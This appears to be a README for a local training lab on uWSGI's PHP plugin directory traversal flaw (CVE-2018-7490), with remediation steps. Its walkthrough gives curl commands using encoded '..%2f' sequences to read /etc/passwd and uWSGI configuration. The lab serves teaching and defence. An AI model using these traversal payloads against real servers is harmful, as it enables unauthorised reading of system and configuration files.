# uWSGI PHP Plugin Directory Traversal & Arbitrary File Read (CVE-2018-7490)

## Overview

uWSGI is an application server container widely used in Python and PHP deployments. In uWSGI versions prior to 2.0.17, the PHP plugin implementation failed to properly sanitize document root path prefixes when handling incoming HTTP requests. An unauthenticated remote attacker can submit URL-encoded directory traversal sequences (..%2f) to escape the web root and read arbitrary files from the filesystem.

- **Service Access**: `http://localhost:8153/`
- **Default Credentials**: `Unauthenticated`
- **Docker Shortcut**: `./lab start uwsgi-traversal`
- **Container Name**: `cyberlab_02_uwsgi_php_traversal`
- **RAM Footprint**: ~80M

---

## Exploitation Walkthrough

### 1. Read System Password File via Directory Traversal

```bash
curl 'http://localhost:8153/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
```

### 2. Inspect Configuration Files

```bash
curl 'http://localhost:8153/..%2f..%2f..%2f..%2f..%2fetc%2fuwsgi.ini'
```

### 3. Verify Output

```bash
# Output displays root user records and server configuration details.
```

---

## Defensive Remediation & Hardening

1. Upgrade uWSGI to version 2.0.17 or higher.
2. Configure chroot or jail restrictions for the uWSGI process.
3. Enforce reverse proxy path normalization before requests reach application servers.

---

## Video Walkthroughs & Technical References

- [Bugcrowd Security Flash - Apache CVE 2021-41773](https://www.youtube.com/watch?v=x0Bk7nqeB4k)
- [uWSGI CVE-2018-7490 Advisory](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.17.html)
- [Vulhub uWSGI PHP Environment](https://vulhub.org/#/environments/uwsgi/CVE-2018-7490/)
